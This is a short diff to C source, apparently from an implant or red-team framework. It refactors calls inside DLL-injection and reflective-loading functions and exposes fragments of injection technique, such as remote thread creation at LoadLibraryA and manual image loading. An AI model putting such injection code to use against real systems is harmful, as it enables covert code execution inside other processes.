@@ -22,7 +22,7 @@ FUNC UINT32 InjectionDll(
     bkErrorCode =  bkMemWrite( ProcessHandle, MemoryAlloc, DllPath, StringLengthA( DllPath ) );
     if ( bkErrorCode != 0 ) goto _Leave;
     
-    bkErrorCode =  bkThreadCreate( ProcessHandle, Instance()->Win32.LoadLibraryA, MemoryAlloc, 0, 0, 0, &ThreadHandle );
+    bkErrorCode =  bkThreadCreate( ProcessHandle, Win32().LoadLibraryA, MemoryAlloc, 0, 0, 0, &ThreadHandle );
     if ( bkErrorCode != 0 ) goto _Leave;
     
 _Leave:
@@ -157,7 +157,7 @@ FUNC PVOID InjectionReflective(
 
     if ( EntryExcept->Size ) {
         PIMAGE_RUNTIME_FUNCTION_ENTRY ImgRunFuncEntry = C_PTR( BaseAddress + EntryExcept->VirtualAddress );
-        Instance()->Win32.RtlAddFunctionTable( (PRUNTIME_FUNCTION)( ImgRunFuncEntry ), ( EntryExcept->Size / sizeof( IMAGE_RUNTIME_FUNCTION_ENTRY ) ), BaseAddress );
+        Win32().RtlAddFunctionTable( (PRUNTIME_FUNCTION)( ImgRunFuncEntry ), ( EntryExcept->Size / sizeof( IMAGE_RUNTIME_FUNCTION_ENTRY ) ), BaseAddress );
     }
 
     if ( EntryTls->Size ) {
@@ -169,7 +169,7 @@ FUNC PVOID InjectionReflective(
         }
     }
 
-    Instance()->Win32.NtFlushInstructionCache( NtCurrentProcess(), NULL, 0 );
+    Win32().NtFlushInstructionCache( NtCurrentProcess(), NULL, 0 );
 
     UINT64 EntryPoint = U_PTR( BaseAddress ) + ImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
 
